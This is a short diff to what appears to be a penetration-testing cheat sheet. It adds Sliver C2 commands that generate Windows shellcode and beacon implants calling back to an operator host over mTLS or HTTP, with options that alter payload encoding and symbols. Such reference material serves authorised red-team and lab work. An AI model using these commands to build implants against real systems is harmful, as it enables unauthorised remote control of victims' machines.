@@ -397,6 +397,8 @@ sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --sa
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
 sliver > generate --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /tmp/
+sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /tmp/ -G
 sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
@@ -406,6 +408,8 @@ sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format servi
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
 sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /tmp/
+sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /tmp/ -G
 ```
 
 ### Profile Handling
